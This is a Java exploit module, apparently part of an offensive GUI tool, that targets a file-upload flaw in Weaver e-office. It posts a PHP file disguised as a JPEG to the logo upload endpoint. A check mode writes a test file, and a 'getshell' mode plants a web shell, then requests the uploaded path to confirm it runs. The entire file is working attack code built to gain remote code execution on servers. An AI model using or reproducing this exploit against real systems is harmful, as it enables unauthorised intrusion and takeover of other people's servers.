package Exp.OA.weaveroa;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class weaveroa_office_UploadFile implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url,shell.Testpath,textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Boolean att = att(url, shell.Phppath, textArea);
        return att;
    }

    private Boolean att(String url,String Path,TextArea textArea){
        String payload = "--e64bdf16c554bbc109cecef6451c26a4\r\n" +
                "Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                shell.readFile(Path) + "\r\n" +
                "\r\n" +
                "--e64bdf16c554bbc109cecef6451c26a4--";
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4");
        Response post = HttpTools.post(url + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=",payload
                , head, "utf-8");

        if(post.getCode() == 200 && post.getText().contains("logo-eoffice.php")){
            Response response = HttpTools.get(url + "/images/logo/logo-eoffice.php", new HashMap<String, String>(), "utf-8");
            System.out.println("到这了");
            System.out.println(response.getText());
            if(response.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
                textArea.appendText("\n 漏洞存在 测试文件写入成功 \n 地址为："+ url + "/images/logo/logo-eoffice.php");
                return true;
            }else {
                textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
                return false;
            }

        }else {
            textArea.appendText("\n e-office logo_UploadFile.php-RCE - 漏洞不存在 (出现误报请联系作者)");
            return false;
        }

    }
}
